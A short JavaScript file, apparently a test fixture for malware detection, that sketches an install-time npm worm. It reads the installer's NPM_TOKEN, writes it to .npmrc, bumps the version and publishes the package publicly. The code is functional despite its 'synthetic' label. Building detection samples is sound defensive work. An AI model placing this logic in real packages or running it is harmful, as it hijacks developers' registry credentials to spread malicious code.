// FIXTURE ONLY — synthetic detection test sample, not real malware
// Install-time worm shape: take the installer's npm token, bump the version, publish.
const { execSync } = require("child_process");
const fs = require("fs");
const token = process.env.NPM_TOKEN;
if (token) {
  fs.writeFileSync(".npmrc", `//registry.npmjs.org/:_authToken=${token}\n`);
  execSync("npm version patch --no-git-tag-version");
  execSync("npm publish --access public");
}
